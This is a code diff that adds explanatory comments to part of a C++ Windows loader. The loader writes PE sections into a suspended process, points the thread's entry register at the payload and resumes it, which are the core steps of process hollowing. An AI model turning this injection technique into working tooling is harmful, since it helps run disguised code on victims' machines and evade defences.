@@ -1,4 +1,4 @@
-#include "Loader.h"
+﻿#include "Loader.h"
 
 Loader::Loader()
 {
@@ -101,10 +101,17 @@ void Loader::Execute(LPBYTE buff)
 		return;
 	}
 
+	// Write all sections 
 	for (SIZE_T iSection = 0; iSection < pNtHdr->FileHeader.NumberOfSections; ++iSection){
 		
+		// Pointer to section header 
 		pSectionHdr = PIMAGE_SECTION_HEADER(DWORD64(pNtHdr) + sizeof(IMAGE_NT_HEADERS) + iSection * sizeof(IMAGE_SECTION_HEADER));
  		
+		// Write Section
+		// 'buff' buffer pointer
+		// 'lpImageBase + pSectionHdr->VirtualAddress' virtual address in process memory where the data from the buffer will be copied.
+		// 'pSectionHdr->PointerToRawData' offset from the beginning of the file to the beginning of the source data for a particular section.
+		// This offset is used to calculate the address in the buffer from which the data for a given section should be taken.
 		if (!WriteProcessMemory(
 			pi.hProcess,
 			(LPVOID)((DWORD64)(lpImageBase) + pSectionHdr->VirtualAddress),
@@ -129,8 +136,10 @@ void Loader::Execute(LPBYTE buff)
 		return;
 	}
 
+	// Move address of entry point to the rcx register
 	ctx->Rcx = (DWORD64)(lpImageBase) + pNtHdr->OptionalHeader.AddressOfEntryPoint;
 
+	// Set the context
 	if (!SetThreadContext(pi.hThread,ctx))
 	{
 		DWORD error = GetLastError();
@@ -139,7 +148,7 @@ void Loader::Execute(LPBYTE buff)
 		TerminateProcess(pi.hProcess,-9);
 		return;
 	}
-
+	// ´Start the process
 	if (!ResumeThread(pi.hThread))
 	{
 		DWORD error = GetLastError();
@@ -149,6 +158,7 @@ void Loader::Execute(LPBYTE buff)
 		return;
 	}
 
+	// DONE!
 	return;
 }
 
